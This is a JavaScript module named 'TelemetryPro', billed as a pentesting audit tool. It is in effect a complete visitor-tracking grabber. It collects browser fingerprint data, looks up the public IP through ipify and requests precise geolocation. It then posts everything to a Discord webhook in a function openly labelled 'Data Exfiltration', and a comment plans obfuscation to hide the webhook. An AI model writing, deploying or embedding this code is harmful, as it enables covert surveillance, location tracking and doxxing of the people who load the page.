/**
 * TelemetryPro v1.0.0 - Unified Audit Module
 * Professional-grade metadata logging for security pentesting.
 */

const TelemetryScanner = {
    // 1. System Metadata (The Fingerprint)
    getBrowserData: () => {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cores: navigator.hardwareConcurrency || 'N/A',
            memory: navigator.deviceMemory || 'N/A', // RAM in GB
            touchPoints: navigator.maxTouchPoints || 0
        };
    },

    // 2. Network Identification
    getIPData: async () => {
        try {
            // Using ipify for the public IP
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (err) {
            return "Connection Masked/Failed";
        }
    },

    // 3. Geolocation Data
    getLocation: () => {
        return new Promise((resolve) => {
            if (!navigator.geolocation) resolve("Unsupported");
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: `${pos.coords.accuracy}m`
                }),
                (err) => resolve(`Denied (${err.code})`)
            );
        });
    },

    // 4. Data Exfiltration (Discord Webhook)
    // TODO: add obf to hide the webhook
    sendToWebhook: async (auditData) => {
        // REPLACE THIS with your actual Discord Webhook URL
        const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';

        const payload = {
            username: "Telemetry Bot",
            avatar_url: "https://i.imgur.com/4M34hi2.png", // Optional bot icon
            embeds: [{
                title: "🚨 New Audit Log Captured",
                color: 5814783, // Blurple
                fields: [
                    { name: "🌐 IP Address", value: `\`${auditData.publicIP}\``, inline: true },
                    { name: "📍 Location", value: typeof auditData.location === 'object' ? 
                        `[Maps](https://www.google.com/maps?q=${auditData.location.lat},${auditData.location.lon})` : 
                        auditData.location, inline: true },
                    { name: "💻 Platform", value: auditData.browser.platform, inline: true },
                    { name: "🕒 Timezone", value: auditData.browser.timezone, inline: true },
                    { name: "🛡️ Hardware", value: `${auditData.browser.cores} Cores | ${auditData.browser.memory}GB RAM`, inline: true },
                    { name: "📱 User Agent", value: `\`\`\`${auditData.browser.userAgent}\`\`\`` }
                ],
                footer: { text: `System Audit • ${auditData.timestamp}` }
            }]
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (err) {
            console.error("Exfiltration failed. Check Webhook URL.");
        }
    },

    // 5. Execution Wrapper
    runAudit: async () => {
        const report = {
            timestamp: new Date().toLocaleString(),
            browser: TelemetryScanner.getBrowserData(),
            publicIP: await TelemetryScanner.getIPData(),
            location: await TelemetryScanner.getLocation()
        };

        await TelemetryScanner.sendToWebhook(report);
        return report;
    }
};